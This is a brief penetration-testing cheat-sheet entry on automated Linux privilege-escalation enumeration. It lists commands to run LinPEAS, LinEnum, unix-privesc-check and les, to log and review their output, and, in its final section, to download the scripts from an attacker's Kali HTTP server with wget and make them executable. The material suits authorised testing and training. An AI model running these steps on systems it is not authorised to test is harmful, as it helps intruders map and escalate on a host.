---
title: Automated Linux Enumeration (LinPEAS / LinEnum)
category: privesc
subcategory: linux-tools
os: linux
command: ./linpeas.sh
tools: linpeas, linenum, unix-privesc-check, les
---


### LinPEAS

```bash
./linpeas.sh
```

### LinEnum

```bash
./LinEnum.sh
```

### unix-privesc-check

```bash
unix-privesc-check standard > output.txt
unix-privesc-check detailed > output.txt
```

### Mass enum one-liner

```bash
/tmp/test/linpeas.sh | tee linpeas.log && /tmp/test/les.sh -i | tee les.log
```

### Review collected output

```bash
cat *.log
less -R *.log
```

### Pull all enum scripts from your Kali HTTP server

```bash
wget -nH -r 10.13.31.108 && rm index.html
chmod +x *.sh
```
